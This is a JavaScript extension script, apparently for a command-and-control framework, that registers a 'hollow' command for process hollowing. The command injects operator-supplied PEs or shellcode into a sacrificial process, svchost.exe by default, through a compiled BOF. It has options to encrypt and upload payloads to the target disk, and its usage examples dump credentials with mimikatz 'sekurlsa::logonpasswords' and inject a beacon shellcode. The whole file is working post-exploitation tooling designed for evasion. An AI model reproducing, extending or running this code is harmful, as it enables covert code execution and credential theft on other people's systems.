var cmd_hollow = ax.create_command(
    "hollow",
    "Process hollowing (PE/shellcode) into a sacrificial process.\n" +
    "  PE mode:   Supports x64 and x86 PEs (auto-detected from headers).\n" +
    "  SC mode:   x64 by default. Use --x86 for 32-bit shellcode.\n" +
    "  --upload-enc: encrypt PE/SC and write to target disk for later reuse.\n" +
    "  --dec:     decrypt an --upload-enc file before hollowing (with --local-pe/--local-sc).\n" +
    "  Output captured via pipes. Fire-and-forget with -no.",
    'hollow --pe /opt/mimikatz.exe -a "privilege::debug sekurlsa::logonpasswords"\n' +
    'hollow --upload-enc /opt/mimikatz.exe --enc-path c:\\temp\\m.enc\n' +
    'hollow --local-pe c:\\temp\\m.enc --dec -a "coffee"\n' +
    'hollow --sc /opt/beacon.bin -no\n' +
    'hollow --local-pe C:\\Windows\\Temp\\tool.exe -a "/all"'
);

cmd_hollow.addArgFlagFile("--pe",          "PE_FILE",     false, "Native PE from operator (x64 or x86, auto-detected)");
cmd_hollow.addArgFlagFile("--sc",          "SC_FILE",     false, "Shellcode from operator (x64 default, --x86 for 32-bit)");
cmd_hollow.addArgFlagFile("--upload-enc",  "ENC_FILE",    false, "Encrypt and upload file to target disk");
cmd_hollow.addArgFlagString("--enc-path",  "ENC_PATH",    false, "Target path for encrypted upload (with --upload-enc)");
cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH",    false, "Native PE on target (local path or UNC)");
cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",      false, "Shellcode on target (local path)");
cmd_hollow.addArgFlagString("-a",          "ARGS",        false, "Arguments passed to the PE");
cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",    false, "Sacrificial process (default: auto svchost.exe)");
cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",     false, "Output capture timeout in seconds (default: 60)");
cmd_hollow.addArgBool("-no",                                      "Fire and forget — no output capture");
cmd_hollow.addArgBool("--x86",                                    "Force x86 mode (for 32-bit shellcode)");
cmd_hollow.addArgBool("--dec",                                     "Decrypt encrypted local file before hollowing");
cmd_hollow.addArgBool("--async",                                   "Run BOF asynchronously (returns immediately)");

cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.is64(id) == false) { throw new Error("Only x64 agents supported (payload can be x86 or x64)"); }

    var hasPE        = "PE_FILE" in parsed_json;
    var hasSC        = "SC_FILE" in parsed_json;
    var hasUploadEnc = "ENC_FILE" in parsed_json;
    var hasEncPath   = "ENC_PATH" in parsed_json;
    var hasLocalPE   = "WIN_PATH" in parsed_json;
    var hasLocalSC   = "WIN_SC" in parsed_json;
    var hasDec       = parsed_json["--dec"] ? true : false;

    var inputCount = (hasPE ? 1 : 0) + (hasSC ? 1 : 0) + (hasUploadEnc ? 1 : 0) +
                     (hasLocalPE ? 1 : 0) + (hasLocalSC ? 1 : 0);
    if (inputCount === 0) throw new Error("Provide one of: --pe, --sc, --upload-enc, --local-pe, --local-sc");
    if (inputCount > 1)   throw new Error("Only one input source allowed");

    if (hasUploadEnc && !hasEncPath) throw new Error("--upload-enc requires --enc-path <target_path>");
    if (hasDec && !hasLocalPE && !hasLocalSC) throw new Error("--dec can only be used with --local-pe or --local-sc");

    var mode = 0;
    var source = 0;
    var payloadBytes = "";
    var localPath = "";

    if (hasPE) {
        mode = 0; source = 0;
        payloadBytes = parsed_json["PE_FILE"];
    } else if (hasSC) {
        mode = 1; source = 0;
        payloadBytes = parsed_json["SC_FILE"];
    } else if (hasUploadEnc) {
        mode = 2; source = 0;
        payloadBytes = parsed_json["ENC_FILE"];
        localPath = parsed_json["ENC_PATH"];
    } else if (hasLocalPE) {
        mode = 0; source = 1;
        localPath = parsed_json["WIN_PATH"];
    } else if (hasLocalSC) {
        mode = 1; source = 1;
        localPath = parsed_json["WIN_SC"];
    }

    var noOutput = parsed_json["-no"] ? 1 : 0;
    var timeout  = ("SECONDS" in parsed_json) ? parsed_json["SECONDS"] * 1000 : 15000;
    var flags    = 0;
    if (parsed_json["--x86"]) flags |= 1;
    if (hasDec) flags |= 2;
    var spawnto  = ("SPAWN_TO" in parsed_json) ? parsed_json["SPAWN_TO"] : "";
    var args     = ("ARGS" in parsed_json) ? parsed_json["ARGS"] : "";
    var async    = parsed_json["--async"] ? "-a " : "";

    var bof_params = ax.bof_pack(
        "int,int,int,int,int,int,cstr,cstr,cstr,bytes",
        [mode, source, noOutput, timeout, flags, 0, spawnto, args, localPath, payloadBytes]
    );

    var bof_path = ax.script_dir() + "_bin/hollow." + ax.arch(id) + ".o";

    var label;
    if (mode === 2) label = "upload-enc";
    else if (mode === 0) label = "PE";
    else label = "shellcode";
    var srcLabel = source === 0 ? "operator" : "target";
    var message = "Task: " + label + " hollow (" + srcLabel + ") -> " + (spawnto || "svchost.exe");

    ax.execute_alias(id, cmdline, "execute bof " + async + '"' + bof_path + '" ' + bof_params, message);
});
